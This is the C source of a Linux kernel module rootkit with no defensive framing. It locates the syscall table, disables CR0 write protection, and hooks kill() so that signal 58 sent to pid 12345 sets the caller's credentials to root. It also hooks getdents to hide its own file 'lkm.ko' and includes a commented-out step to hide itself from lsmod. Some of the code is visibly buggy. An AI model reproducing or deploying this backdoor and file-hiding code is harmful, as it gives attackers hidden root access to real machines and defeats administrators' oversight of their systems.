#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <asm/unistd.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <asm/system.h>
#include <asm/cacheflush.h>
#include <linux/proc_fs.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/fs_struct.h>
//#include <linux/file.h>
//#include <linux/errno.h>
//#include <linux/mm.h>
//#include <linux/security.h>
//#include <linux/stddef.h>

MODULE_LICENSE("GPL");

#ifdef __i386__
#define START_MEM   0xc0000000
#define END_MEM     0xd0000000
#else
#define START_MEM	0xffffffff81000000
#define END_MEM		0xffffffffa2000000
#endif

#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)

#ifdef __i386__
unsigned int *syscall_table; 

unsigned int **find() { //finds the syscall table, not exported as of 2.6 (32bit)
    unsigned int **sctable;
    unsigned int i = START_MEM;
    while ( i < END_MEM) {
        sctable = (unsigned int **)i;
        if ( sctable[__NR_close] == (unsigned int *) sys_close) {
            return &sctable[0];
        }   
        i += sizeof(void *);
    }
    return NULL;
}
#else
unsigned long long *syscall_table; 
unsigned long long  **find() { //same as above but 64bit
	unsigned long long **sctable;
	unsigned long long int i = START_MEM;
	while ( i < END_MEM) {
		sctable = (unsigned long long **)i;
		if ( sctable[__NR_close] == (unsigned long long *) sys_close) {
			return &sctable[0];
		}	
		i += sizeof(void *);
	}
	return NULL;
}
#endif
asmlinkage int (*original_kill)(pid_t pid, int sig);

asmlinkage int new_kill(pid_t pid, int sig) { //redefines kill syscall, if killing with sig 58
    if ((pid == 12345) && (sig == 58)) {      //and pid 12345 then give parent root privs
        struct task_struct *ptr = current;
        struct cred *cred;
        cred=__task_cred(ptr);
        cred->uid = 0;
        cred->gid = 0;
        cred->suid = 0;
        cred->sgid = 0;
        cred->euid = 0;
        cred->egid = 0;
        cred->fsuid = 0;
        cred->fsgid = 0;
        return 0;
    }
    return (*original_kill)(pid,sig);
}
/*
    Hiding files:
    hook getdents
    call the original with my own struct dirent
    go through dirent and prev->next = curr->next
    memcpy_to_user() with my struct dirent to their struct dirent
    will hide /proc/ entries as well to hide process
*/

asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    struct linux_dirent {
        long           d_ino;
        off_t          d_off;
        unsigned short d_reclen;
        char           d_name[];
    };
    char buf[count];
    int bpos,nread;
    struct linux_dirent *d,*nd;
    char * hidefile = "lkm.ko";
    nread = (*original_getdents)(fd,dirp,count);
    copy_from_user(buf,dirp,nread);
    for (bpos = 0; bpos < nread;) {
        //printk("MATCH\n");
        d = (struct linux_dirent *) (buf + bpos);
        nd = (struct linux_dirent *) (buf + bpos + d->d_reclen);
        //printk("%d\n",!strcmp(nd->d_name,hidefile));
        if (!strcmp(nd->d_name,hidefile)) {
            d->d_off=(nd->d_off+d->d_off);
            d->d_reclen=(d->d_reclen+nd->d_reclen);
        }
        bpos += d->d_reclen;
    }
    //return nread;
    copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf));
    //i suspect i'm meant to be kfree'ing here...
    return nread;
    //return (*original_getdents)(fd,dirp,count);
}

static int init(void) { //initial function, sets up syscall hijacking
    struct module *myself = &__this_module;
	syscall_table = find(); //give us the syscall table address for modification
//    list_del(&myself->list); //remove from places such as lsmod
    //have to disable previous line otherwise you can't unload module without rebooting
    original_kill = (void *)syscall_table[__NR_kill];
    original_getdents = (void *)syscall_table[__NR_getdents];
    //original_getdents64 = (void *)syscall_table[__NR_getdents64];
    GPF_DISABLE; //messy, but 2.6 doesn't allow modification without this. see macro above
    syscall_table[__NR_getdents] = new_getdents;
    syscall_table[__NR_kill] = new_kill;
    //syscall_table[__NR_getdents64] = new_getdents64;
    GPF_ENABLE;
    printk("INIT OK\n");
	return 0;
}

void cleanup_module(void) {
    GPF_DISABLE;
    syscall_table[__NR_kill] = original_kill; //corrects the hijacking on unload
    syscall_table[__NR_getdents] = original_getdents;
    //syscall_table[__NR_getdents64] = original_getdents64;
    GPF_ENABLE;
    printk("UNLOAD OK\n");
    return;
}

module_init(init);
